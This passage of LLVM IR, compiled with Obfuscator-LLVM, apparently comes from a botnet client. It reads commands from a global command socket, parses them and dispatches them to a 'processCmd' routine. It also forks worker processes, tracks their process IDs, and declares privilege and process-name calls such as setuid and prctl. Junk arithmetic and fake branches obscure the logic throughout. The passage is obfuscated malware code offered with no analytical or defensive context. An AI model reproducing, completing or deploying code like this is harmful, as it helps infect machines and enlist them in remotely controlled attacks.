  %714 = load i32, i32* %22, align 4
  %715 = load i32, i32* %20, align 4
  %716 = icmp slt i32 %714, %715
  br i1 %716, label %717, label %725

; <label>:717:                                    ; preds = %713
  %718 = load i32, i32* %22, align 4
  %719 = sext i32 %718 to i64
  %720 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %719
  %721 = load i8*, i8** %720, align 8
  call void @free(i8* %721) #5
  br label %722

; <label>:722:                                    ; preds = %717
  %723 = load i32, i32* %22, align 4
  %724 = add nsw i32 %723, 1
  store i32 %724, i32* %22, align 4
  br label %713

; <label>:725:                                    ; preds = %713
  br label %726

; <label>:726:                                    ; preds = %725, %originalBBpart2132
  br label %727

; <label>:727:                                    ; preds = %726, %425
  br label %137

; <label>:728:                                    ; preds = %originalBBpart212
  br label %729

; <label>:729:                                    ; preds = %728, %105
  ret i32 0

originalBBalteredBB:                              ; preds = %originalBB, %55
  %730 = call i32 @fork() #5
  store i32 %730, i32* %8, align 4
  %731 = icmp ne i32 %730, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %79
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %111
  %732 = call i32 @sleep(i32 5)
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %137
  %733 = load i32, i32* @mainCommSock, align 4
  %734 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %735 = call i32 @recvLine(i32 %733, i8* %734, i32 4096)
  store i32 %735, i32* %11, align 4
  %736 = icmp ne i32 %735, -1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %159
  %737 = load i32, i32* %12, align 4
  %738 = sext i32 %737 to i64
  %739 = load i64, i64* @numpids, align 8
  %740 = icmp ult i64 %738, %739
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %180
  %741 = load i32*, i32** @pids, align 8
  %742 = load i32, i32* %12, align 4
  %743 = sext i32 %742 to i64
  %744 = getelementptr inbounds i32, i32* %741, i64 %743
  %745 = load i32, i32* %744, align 4
  %746 = call i32 @waitpid(i32 %745, i32* null, i32 1)
  %747 = icmp sgt i32 %746, 0
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %207
  %748 = load i32, i32* %14, align 4
  %749 = zext i32 %748 to i64
  %750 = load i64, i64* @numpids, align 8
  %751 = icmp ult i64 %749, %750
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %239
  %752 = load i32, i32* %14, align 4
  %_ = shl i32 %752, 1
  %_27 = sub i32 0, %752
  %gen = add i32 %_27, 1
  %_28 = sub i32 0, %752
  %gen29 = add i32 %_28, 1
  %_30 = sub i32 0, %752
  %gen31 = add i32 %_30, 1
  %_32 = sub i32 0, %752
  %gen33 = add i32 %_32, 1
  %753 = add i32 %752, 1
  store i32 %753, i32* %14, align 4
  br label %originalBB26

originalBB37alteredBB:                            ; preds = %originalBB37, %271
  %754 = load i32, i32* %14, align 4
  %755 = zext i32 %754 to i64
  %756 = load i64, i64* @numpids, align 8
  %757 = icmp ult i64 %755, %756
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %292
  %758 = load i32*, i32** @pids, align 8
  %759 = load i32, i32* %14, align 4
  %760 = zext i32 %759 to i64
  %761 = getelementptr inbounds i32, i32* %758, i64 %760
  %762 = load i32, i32* %761, align 4
  %763 = load i32*, i32** %13, align 8
  %764 = load i32, i32* %14, align 4
  %765 = zext i32 %764 to i64
  %766 = getelementptr inbounds i32, i32* %763, i64 %765
  store i32 %762, i32* %766, align 4
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %326
  %767 = load i32, i32* %12, align 4
  %_46 = shl i32 %767, 1
  %_47 = shl i32 %767, 1
  %_48 = sub i32 0, %767
  %gen49 = add i32 %_48, 1
  %_50 = shl i32 %767, 1
  %_51 = sub i32 %767, 1
  %gen52 = mul i32 %_51, 1
  %_53 = shl i32 %767, 1
  %_54 = sub i32 %767, 1
  %gen55 = mul i32 %_54, 1
  %768 = add nsw i32 %767, 1
  store i32 %768, i32* %12, align 4
  br label %originalBB45

originalBB59alteredBB:                            ; preds = %originalBB59, %345
  %769 = load i32, i32* %11, align 4
  %770 = sext i32 %769 to i64
  %771 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %770
  store i8 0, i8* %771, align 1
  %772 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %772)
  %773 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %774 = call i8* @strstr(i8* %773, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.967, i32 0, i32 0)) #9
  %775 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %776 = icmp eq i8* %774, %775
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %370
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %387
  %777 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %778 = call i8* @strstr(i8* %777, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.968, i32 0, i32 0)) #9
  %779 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %780 = icmp eq i8* %778, %779
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %408
  call void @exit(i32 0) #11
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %431
  %781 = load i8*, i8** %15, align 8
  %782 = getelementptr inbounds i8, i8* %781, i64 1
  store i8* %782, i8** %16, align 8
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %480
  %783 = load i8*, i8** %15, align 8
  %784 = load i8*, i8** %15, align 8
  %785 = call i64 @strlen(i8* %784) #9
  %_80 = sub i64 0, %785
  %gen81 = add i64 %_80, 1
  %786 = sub i64 %785, 1
  %787 = getelementptr inbounds i8, i8* %783, i64 %786
  %788 = load i8, i8* %787, align 1
  %789 = zext i8 %788 to i32
  %790 = icmp eq i32 %789, 10
  br label %originalBB79

originalBB85alteredBB:                            ; preds = %originalBB85, %529
  %791 = load i8*, i8** %15, align 8
  %792 = load i8, i8* %791, align 1
  %793 = zext i8 %792 to i32
  %794 = icmp ne i32 %793, 0
  br label %originalBB85

originalBB89alteredBB:                            ; preds = %originalBB89, %550
  br label %originalBB89

originalBB93alteredBB:                            ; preds = %originalBB93, %571
  %795 = load i8*, i8** %15, align 8
  store i8 0, i8* %795, align 1
  %796 = load i8*, i8** %15, align 8
  %797 = getelementptr inbounds i8, i8* %796, i32 1
  store i8* %797, i8** %15, align 8
  %798 = load i8*, i8** %17, align 8
  store i8* %798, i8** %18, align 8
  br label %originalBB93

originalBB97alteredBB:                            ; preds = %originalBB97, %613
  %799 = load i8*, i8** %21, align 8
  %800 = load i8, i8* %799, align 1
  %801 = zext i8 %800 to i32
  %802 = icmp ne i32 %801, 10
  br label %originalBB97

originalBB101alteredBB:                           ; preds = %originalBB101, %634
  %803 = load i8*, i8** %21, align 8
  %804 = call i64 @strlen(i8* %803) #9
  %805 = add i64 %804, 1
  %806 = call noalias i8* @malloc(i64 %805) #5
  %807 = load i32, i32* %20, align 4
  %808 = sext i32 %807 to i64
  %809 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %808
  store i8* %806, i8** %809, align 8
  %810 = load i32, i32* %20, align 4
  %811 = sext i32 %810 to i64
  %812 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %811
  %813 = load i8*, i8** %812, align 8
  %814 = load i8*, i8** %21, align 8
  %815 = call i64 @strlen(i8* %814) #9
  %_102 = shl i64 %815, 1
  %_103 = sub i64 0, %815
  %gen104 = add i64 %_103, 1
  %_105 = sub i64 0, %815
  %gen106 = add i64 %_105, 1
  %_107 = sub i64 %815, 1
  %gen108 = mul i64 %_107, 1
  %_109 = sub i64 0, %815
  %gen110 = add i64 %_109, 1
  %_111 = shl i64 %815, 1
  %_112 = sub i64 %815, 1
  %gen113 = mul i64 %_112, 1
  %_114 = sub i64 %815, 1
  %gen115 = mul i64 %_114, 1
  %816 = add i64 %815, 1
  call void @llvm.memset.p0i8.i64(i8* %813, i8 0, i64 %816, i32 1, i1 false)
  %817 = load i32, i32* %20, align 4
  %818 = sext i32 %817 to i64
  %819 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %818
  %820 = load i8*, i8** %819, align 8
  %821 = load i8*, i8** %21, align 8
  %822 = call i8* @strcpy(i8* %820, i8* %821) #5
  %823 = load i32, i32* %20, align 4
  %_116 = shl i32 %823, 1
  %_117 = sub i32 %823, 1
  %gen118 = mul i32 %_117, 1
  %_119 = sub i32 0, %823
  %gen120 = add i32 %_119, 1
  %_121 = shl i32 %823, 1
  %_122 = shl i32 %823, 1
  %824 = add nsw i32 %823, 1
  store i32 %824, i32* %20, align 4
  br label %originalBB101

originalBB126alteredBB:                           ; preds = %originalBB126, %673
  %825 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.969, i32 0, i32 0)) #5
  store i8* %825, i8** %21, align 8
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %691
  %826 = load i32, i32* %20, align 4
  %827 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %826, i8** %827)
  %828 = load i32, i32* %20, align 4
  %829 = icmp sgt i32 %828, 1
  br label %originalBB130
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #3

declare i32 @prctl(...) #1

declare i32 @waitpid(i32, i32*, i32) #1

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare i32 @setuid(i32) #3

; Function Attrs: nounwind
declare i32 @seteuid(i32) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

declare i32 @sleep(i32) #1

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn nounwind }
attributes #12 = { noreturn }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146434664}
!2 = !{i32 -2146433536}
!3 = !{i32 -2146432845}
!4 = !{i32 -2146432096}
!5 = !{i32 -2146431011}
!6 = !{i32 -2146430042}
!7 = !{i32 -2146428953}
!8 = !{i32 -2146427852}
!9 = !{i32 -2146426845}
!10 = !{i32 -2146425836}
